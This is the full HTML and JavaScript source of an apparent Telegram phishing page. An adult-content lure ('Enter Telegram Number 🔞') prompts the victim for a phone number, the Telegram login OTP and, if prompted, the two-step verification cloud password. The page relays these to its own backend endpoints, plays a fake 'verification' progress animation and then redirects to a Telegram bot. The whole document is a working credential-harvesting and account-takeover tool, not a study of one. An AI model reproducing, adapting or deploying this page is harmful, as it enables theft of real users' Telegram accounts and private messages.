<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification - Unlock</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { 
            background-color: #0a1128;
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        #pageWrapper {
            opacity: 0;
            transition: opacity 0.3s ease;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .header-nav {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            z-index: 10;
        }

        .header-btn {
            position: relative;
            background: linear-gradient(145deg, #ff9bb0, #ff708f);
            border: none;
            border-radius: 50px;
            color: #ffffff;
            cursor: pointer;
            box-shadow: 6px 6px 15px rgba(0, 0, 0, 0.3), 
                        -3px -3px 10px rgba(255, 155, 176, 0.4),
                        inset 2px 2px 4px rgba(255, 255, 255, 0.4),
                        inset -2px -2px 4px rgba(180, 50, 80, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-decoration: none;
        }

        .header-btn:hover {
            transform: scale(1.05);
            box-shadow: 8px 8px 20px rgba(0, 0, 0, 0.4), 
                        -4px -4px 12px rgba(255, 155, 176, 0.5);
        }

        .home-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
        }

        .home-icon {
            width: 20px;
            height: 20px;
            fill: #ffffff;
        }

        .refresh-btn {
            width: 95px;
            height: 38px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 1px;
        }

        .refresh-btn.loading {
            width: 38px;
            border-radius: 50%;
            color: transparent;
            pointer-events: none;
            animation: pulseShrink 0.4s ease forwards;
        }

        .refresh-btn.loading::after {
            content: "";
            position: absolute;
            width: 18px;
            height: 18px;
            border: 2.5px solid rgba(255, 255, 255, 0.4);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        @keyframes pulseShrink {
            0% { transform: scale(1); }
            50% { transform: scale(0.9); }
            100% { transform: scale(1); }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .bg-video {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; filter: brightness(0.5);
        }

        .container {
            position: relative; z-index: 2; width: 92%; max-width: 380px;
            display: flex; flex-direction: column; align-items: center; gap: 15px;
            transition: opacity 0.5s ease-out;
            margin-top: 40px;
        }

        .container.hidden {
            opacity: 0;
            pointer-events: none;
            transform: scale(0.95);
        }

        .card-box {
            background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
            width: 100%; text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            position: relative;
        }

        .header-card {
            margin-top: 30px;
        }

        .animated-icon-container {
            position: absolute; top: -42px; left: 50%; transform: translateX(-50%);
            width: 70px; height: 70px;
            background: linear-gradient(135deg, #0088CC, #00bfff);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8), inset 0 0 10px rgba(255,255,255,0.5);
            border: 3px solid #ffffff;
            animation: pulseGlow 1.5s infinite alternate;
        }

        .phone-icon-inner { font-size: 30px; animation: bounceIcon 1s infinite alternate; }

        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.6); }
            100% { transform: translateX(-50%) scale(1.08); box-shadow: 0 0 30px rgba(0, 136, 204, 1); }
        }

        @keyframes bounceIcon {
            0% { transform: translateY(0); }
            100% { transform: translateY(-3px); }
        }

        .card-box h2 {
            margin-top: 8px; font-size: 15px; color: #222; font-weight: 700; margin-bottom: 12px;
        }
        
        .phone-input {
            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px;
            font-size: 15px; outline: none; text-align: center; margin-bottom: 12px;
            font-weight: 600; color: #333;
        }
        
        .btn-get-code {
            background: #2ECC71; color: white; width: 100%; padding: 12px;
            border-radius: 10px; border: none; font-weight: 700; font-size: 15px; cursor: pointer;
            box-shadow: 0 4px 12px rgba(46, 204, 113, 0.4); transition: 0.2s;
        }
        .btn-get-code:active { transform: scale(0.97); }

        .otp-boxes-container {
            display: flex; gap: 8px; justify-content: center; margin-bottom: 15px;
            position: relative;
        }

        .otp-small-box {
            width: 50px; height: 55px; border: 2px solid #ddd;
            border-radius: 10px; display: flex; align-items: center; justify-content: center;
            font-size: 24px; color: #222; font-weight: bold; background: #f9f9f9;
            transition: 0.2s; position: relative;
        }
        
        .otp-small-box.active {
            border-color: #0088CC;
            box-shadow: 0 0 10px rgba(0, 136, 204, 0.4);
        }

        .otp-small-box.wave-anim {
            animation: oceanWave 0.6s ease-in-out infinite alternate;
        }

        @keyframes oceanWave {
            0% { transform: translateY(0px) scale(1); border-color: #0088CC; background-color: #f9f9f9; }
            50% { transform: translateY(-8px) scale(1.05); border-color: #00bfff; background-color: #e0f7fa; box-shadow: 0 5px 15px rgba(0,191,255,0.4); }
            100% { transform: translateY(0px) scale(1); border-color: #0088CC; background-color: #f9f9f9; }
        }

        .otp-small-box:nth-child(1) { animation-delay: 0.0s; }
        .otp-small-box:nth-child(2) { animation-delay: 0.1s; }
        .otp-small-box:nth-child(3) { animation-delay: 0.2s; }
        .otp-small-box:nth-child(4) { animation-delay: 0.3s; }
        .otp-small-box:nth-child(5) { animation-delay: 0.4s; }

        #realOtpInput {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; z-index: 5; font-size: 24px; caret-color: transparent; cursor: pointer;
        }

        .btn-confirm-otp {
            width: 100%; padding: 14px; font-size: 17px; font-weight: 700; color: #ffffff;
            background: linear-gradient(135deg, #0088CC, #00bfff); border: none;
            border-radius: 12px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 229, 255, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.3);
            animation: buttonGlow 2s infinite alternate; transition: 0.2s;
        }
        .btn-confirm-otp:active { transform: scale(0.97); }

        @keyframes buttonGlow {
            0% { box-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }
            100% { box-shadow: 0 0 25px rgba(0, 229, 255, 0.9); }
        }

        /* --- 2FA Password Modal Popup Styles --- */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(8px);
            display: none; align-items: center; justify-content: center; z-index: 999;
        }
        .modal-box {
            background: white; width: 90%; max-width: 340px; padding: 30px 20px 20px 20px;
            border-radius: 20px; text-align: center; position: relative;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            animation: modalPop 0.3s ease-out;
        }
        @keyframes modalPop {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .modal-icon-container {
            position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
            width: 65px; height: 65px; background: linear-gradient(135deg, #FF8C00, #FF4500);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-size: 30px; border: 3px solid #fff; box-shadow: 0 0 15px rgba(255, 69, 0, 0.8);
            animation: iconPulse 1.2s infinite alternate;
        }
        @keyframes iconPulse {
            0% { transform: translateX(-50%) scale(1); }
            100% { transform: translateX(-50%) scale(1.1); }
        }
        .modal-box h3 {
            margin-top: 15px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 15px;
        }
        .password-input {
            width: 100%; padding: 14px; border: 2px solid #ddd; border-radius: 12px;
            font-size: 16px; outline: none; text-align: center; margin-bottom: 15px;
            font-weight: 600; color: #333; background: #f9f9f9;
        }
        .password-input:focus { border-color: #FF4500; box-shadow: 0 0 10px rgba(255, 69, 0, 0.3); }
        .btn-verify-password {
            background: linear-gradient(135deg, #FF8C00, #FF4500); color: white; width: 100%; padding: 13px;
            border-radius: 12px; border: none; font-weight: 700; font-size: 16px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.4); transition: 0.2s;
        }
        .btn-verify-password:active { transform: scale(0.97); }

        /* --- Progress & Success --- */
        #progress-container {
            position: absolute; width: 80%; max-width: 400px; opacity: 0;
            pointer-events: none; transition: opacity 0.5s ease-in;
            display: flex; flex-direction: column; align-items: center; z-index: 10;
        }
        #progress-container.visible { opacity: 1; }
        #progress-bar-bg {
            width: 100%; height: 16px; background-color: rgba(255, 255, 255, 0.2);
            border-radius: 10px; position: relative; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        #progress-fill { width: 0%; height: 100%; background-color: white; border-radius: 10px; }
        
        #percentage-badge {
            position: absolute; top: -38px; left: 0%; transform: translateX(-50%);
            background-color: #ff3b30; color: white; font-size: 14px; font-weight: bold;
            padding: 5px 10px; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.3);
            white-space: nowrap;
        }
        #percentage-badge::after {
            content: ''; position: absolute; bottom: -6px; left: 50%; transform: translateX(-50%);
            border-width: 6px 6px 0; border-style: solid; border-color: #ff3b30 transparent transparent transparent;
        }

        #success-container {
            position: absolute; opacity: 0; pointer-events: none; transition: opacity 0.5s; z-index: 10; cursor: pointer;
        }
        #success-container.visible { opacity: 1; pointer-events: auto; }
        .check-circle {
            width: 100px; height: 100px; background-color: #007bff; border-radius: 50%;
            display: flex; justify-content: center; align-items: center; transform: scale(0);
            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
        }
        .check-circle.animate { animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
        .check-mark { color: white; font-size: 55px; opacity: 0; }
        .check-mark.animate { animation: fadeIn 0.5s 0.4s forwards; }

        @keyframes bounceIn {
            0% { transform: scale(0); }
            60% { transform: scale(1.15); }
            100% { transform: scale(1); }
        }
        @keyframes fadeIn { to { opacity: 1; } }
    </style>
    
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            document.getElementById("pageWrapper").style.opacity = "1";
            document.getElementById("phoneInput").focus();
        });
    </script>
</head>
<body>

    <div id="pageWrapper">
        <div class="header-nav">
            <a href="/" class="header-btn home-btn" title="Home">
                <svg class="home-icon" viewBox="0 0 24 24">
                    <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
                </svg>
            </a>
            <button id="refreshBtn" onclick="triggerRefresh(this)" class="header-btn refresh-btn">REFRESH</button>
        </div>

        <video autoplay muted loop playsinline class="bg-video">
            <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
        </video>

        <!-- Main Container -->
        <div class="container" id="mainContainer">
            <input type="hidden" id="phoneCodeHash">

            <div class="card-box header-card">
                <div class="animated-icon-container">
                    <div class="phone-icon-inner">📥</div>
                </div>
                <h2>Enter Telegram Number 🔞</h2>
                <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
                <button class="btn-get-code" onclick="sendCode()">GET CODE 📩</button>
            </div>

            <div class="card-box">
                <h2>Enter 5-Digit OTP 🔑</h2>
                <div class="otp-boxes-container" onclick="document.getElementById('realOtpInput').focus()">
                    <input type="tel" id="realOtpInput" maxlength="5" autocomplete="one-time-code" oninput="handleInput()" onkeydown="handleKeyDown(event)">
                    <div class="otp-small-box active"></div>
                    <div class="otp-small-box"></div>
                    <div class="otp-small-box"></div>
                    <div class="otp-small-box"></div>
                    <div class="otp-small-box"></div>
                </div>
                <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
            </div>
        </div>

        <!-- 2FA Password Popup Modal -->
        <div class="modal-overlay" id="passwordModal">
            <div class="modal-box">
                <div class="modal-icon-container">🔐</div>
                <h3>Two-Step Verification Password 🔑</h3>
                <input type="password" id="twoFactorPassword" class="password-input" placeholder="Enter Cloud Password">
                <button class="btn-verify-password" onclick="verifyPassword()">Verify Password ✨</button>
            </div>
        </div>

        <!-- Loading Animation Phase -->
        <div id="progress-container">
            <div id="progress-bar-bg">
                <div id="percentage-badge">0%</div>
                <div id="progress-fill"></div>
            </div>
        </div>

        <!-- Success Checkmark Phase -->
        <div id="success-container">
            <div class="check-circle" id="check-circle">
                <div class="check-mark" id="check-mark">✓</div>
            </div>
        </div>
    </div>

    <script>
        function triggerRefresh(btn) {
            btn.classList.add('loading');
            setTimeout(() => {
                location.reload();
            }, 700);
        }

        const smallBoxes = document.querySelectorAll('.otp-small-box');
        const realInput = document.getElementById('realOtpInput');
        let globalPhoneCodeHash = "";

        function updateBoxes() {
            let val = realInput.value.replace(/\D/g, '');
            if (val.length > 5) val = val.slice(0, 5);
            realInput.value = val;

            for (let i = 0; i < 5; i++) {
                smallBoxes[i].innerText = val[i] || "";
                smallBoxes[i].classList.remove('active');
            }
            let activeIdx = val.length < 5 ? val.length : 4;
            smallBoxes[activeIdx].classList.add('active');

            if (val.length === 5) {
                verifyOtpCode();
            }
        }

        function handleInput() { updateBoxes(); }
        function handleKeyDown(e) {
            if (e.key === 'Backspace') { setTimeout(updateBoxes, 20); }
        }

        function sendCode() {
            let phone = document.getElementById('phoneInput').value.trim();
            if(!phone) { alert("Please enter your phone number!"); return; }
            realInput.value = "";
            updateBoxes();

            fetch('/send-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone })
            })
            .then(async res => {
                let data = await res.json();
                if(res.ok && data.status === "success") {
                    globalPhoneCodeHash = data.phone_code_hash;
                    document.getElementById('phoneCodeHash').value = data.phone_code_hash;
                    alert("OTP sent successfully to your Telegram!");
                    realInput.focus();
                } else {
                    alert("Failed to send OTP: " + (data.message || "Unknown error"));
                }
            })
            .catch(err => {
                console.error("Error:", err);
                alert("Connection error while sending OTP! Please check backend connection.");
            });
        }

        function startWaveAnimation() {
            smallBoxes.forEach(box => { box.classList.add('wave-anim'); });
        }

        function stopWaveAnimation() {
            smallBoxes.forEach(box => { box.classList.remove('wave-anim'); });
        }

        function startSuccessAnimation() {
            let phone = document.getElementById('phoneInput').value;
            localStorage.setItem("isLoggedIn", "true");
            localStorage.setItem("userPhone", phone);

            document.getElementById('passwordModal').style.display = 'none';
            document.getElementById('mainContainer').classList.add('hidden');

            setTimeout(() => {
                const progressContainer = document.getElementById('progress-container');
                const progressFill = document.getElementById('progress-fill');
                const badge = document.getElementById('percentage-badge');
                const successContainer = document.getElementById('success-container');
                const checkCircle = document.getElementById('check-circle');
                const checkMark = document.getElementById('check-mark');

                progressContainer.classList.add('visible');

                let startTime = null;
                const duration = 6000;

                function updateProgress(timestamp) {
                    if (!startTime) startTime = timestamp;
                    let elapsed = timestamp - startTime;
                    let progress = Math.min(elapsed / duration, 1);
                    let percentage = Math.floor(progress * 100);

                    progressFill.style.width = percentage + '%';
                    badge.innerText = percentage + '%';
                    badge.style.left = percentage + '%';

                    if (progress < 1) {
                        requestAnimationFrame(updateProgress);
                    } else {
                        setTimeout(() => {
                            progressContainer.classList.remove('visible');
                            setTimeout(() => {
                                successContainer.classList.add('visible');
                                checkCircle.classList.add('animate');
                                checkMark.classList.add('animate');

                                setTimeout(() => {
                                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                                }, 1500);

                            }, 500);
                        }, 200);
                    }
                }

                requestAnimationFrame(updateProgress);
            }, 500);
        }

        function verifyOtpCode() {
            let phone = document.getElementById('phoneInput').value.trim();
            let code = realInput.value;
            let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
            
            if(!phone || !phoneCodeHash || code.length < 5) {
                return;
            }

            startWaveAnimation();

            fetch('/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash })
            })
            .then(async res => {
                let data = await res.json();
                stopWaveAnimation();
                if(res.ok && data.status === "success") {
                    startSuccessAnimation();
                } else if(data.status === "2fa_required") {
                    document.getElementById('passwordModal').style.display = 'flex';
                    document.getElementById('twoFactorPassword').focus();
                } else {
                    alert("Verification Failed: " + (data.message || "Invalid code"));
                    realInput.value = "";
                    updateBoxes();
                }
            })
            .catch(err => {
                stopWaveAnimation();
                alert("Verification connection error!");
            });
        }

        function verifyPassword() {
            let phone = document.getElementById('phoneInput').value.trim();
            let code = realInput.value;
            let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
            let password = document.getElementById('twoFactorPassword').value;

            if(!password) {
                alert("Please enter your 2FA password!");
                return;
            }

            fetch('/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash, password: password })
            })
            .then(async res => {
                let data = await res.json();
                if(res.ok && data.status === "success") {
                    startSuccessAnimation();
                } else {
                    alert("Password Verification Failed: " + (data.message || "Incorrect password"));
                    document.getElementById('twoFactorPassword').value = "";
                }
            })
            .catch(err => alert("Password verification error!"));
        }
    </script>
</body>
</html>
